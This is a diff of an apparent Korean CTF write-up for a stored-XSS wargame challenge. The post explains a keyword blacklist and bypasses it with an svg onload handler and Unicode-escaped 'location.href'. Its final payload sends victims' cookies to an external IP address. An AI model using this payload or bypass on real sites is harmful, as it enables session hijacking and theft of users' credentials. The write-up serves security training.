@@ -1,58 +1,36 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 5.2 xss_WAF_2"
+title: "KnockOn Bootcamp 2nd - 5.2 XSS WAF 2"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
   - Filter Bypass
-last_modified_at: 2024-09-08T18:50:00-05:00
+last_modified_at: 2024-09-09T08:50:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10041/>
 
-![5.2 xss_WAF_2 1](/assets/images/writeup/web-hacking/knock-on/5-2_XSS_1.png)
+![5.2 xss_WAF_2 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-2-xss-1.png)
 
-![5.2 xss_WAF_2 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)
+![5.2 xss_WAF_2 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-2-xss-1.png)
 
-![5.2 xss_WAF_2 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)
-
-
-|
-
-|
-
-|
+![5.2 xss_WAF_2 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-2-xss-1.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -196,17 +174,9 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10006, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### add_post()
-
----
 
 ```python
 black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window"]
@@ -232,37 +202,21 @@ def add_post():
 
 하지만 가장 중요한 `location`과 `href`가 막힘
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ### onload 사용 가능 태그 찾기
-
----
 
 `onload` 속성을 활용하겠음
 
 `onload` 속성을 사용할 수 있는 태그는 `black_list`에 있는 태그를들 제외하고 `svg, iframe, style` 등이 있음
 
-|
-
-|
-
 ### location.href 우회
-
----
 
 `location`과 `href`를 사용해야 쿠키를 탈취할 수 있음
 
 이는 유니코드 이스케이프 시퀸스로 대체 가능
 
 [Unicode Escape Encoder / Decoder Online - DenCode](https://dencode.com/string/unicode-escape)
-
-|
 
 ```html
 <svg onload="\u0061lert(1)">
@@ -275,10 +229,6 @@ def add_post():
 ```
 
 알파벳을 하나씩 유니코드로 변환 후 게시글을 작성하면 스크립트가 실행됨
-
-|
-
-|
 
 ### 결과
 
@@ -293,30 +243,14 @@ Referer: http://localhost:10006/
 Accept-Encoding: gzip, deflate
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```html
 <svg onload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```sh
 K0{replace_is_for_loop}
 ```
-
-|
-
----
